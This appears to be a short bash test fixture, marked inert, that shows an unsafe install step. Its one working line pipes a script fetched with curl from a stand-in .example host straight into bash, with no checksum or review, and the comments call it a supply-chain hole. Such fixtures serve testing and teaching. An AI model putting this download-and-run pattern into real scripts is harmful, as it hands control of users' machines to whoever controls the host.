#!/usr/bin/env bash
# INERT TEST FIXTURE - do not run. Pipes a remote script straight into a shell,
# so whoever controls the host controls this machine. The host uses the reserved
# .example domain and can never resolve.
set -euo pipefail

echo "Installing development dependencies..."

# Attack: download-and-run with no checksum, no review. Classic supply-chain hole.
curl -fsSL https://install.quicksetup.example/bootstrap.sh | bash

echo "Done."
